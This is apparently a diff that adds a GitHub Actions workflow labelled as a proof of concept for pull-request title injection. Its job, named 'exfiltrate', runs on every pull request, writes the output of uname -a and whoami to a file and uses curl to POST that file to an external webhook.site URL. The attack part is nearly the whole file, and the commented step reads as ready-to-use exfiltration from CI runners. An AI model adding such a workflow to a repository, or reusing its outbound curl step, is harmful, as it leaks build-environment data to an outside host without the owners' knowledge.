@@ -1,0 +1,21 @@
+name: PoC Title Injection
+
+on:
+  pull_request:
+
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    env:
+      TITLE: ${{ github.event.pull_request.title }}
+    steps:
+      - name: Debug Title Injection
+        run: |
+          echo "Extracted title: ${TITLE}"
+          
+          # Write system info to a file
+          uname -a > out.txt
+          whoami >> out.txt
+          
+          # Send it to your webhook
+          curl -X POST --data-binary @out.txt https://webhook.site/1e9893ef-b9fa-4c63-a2ae-642d992cc639
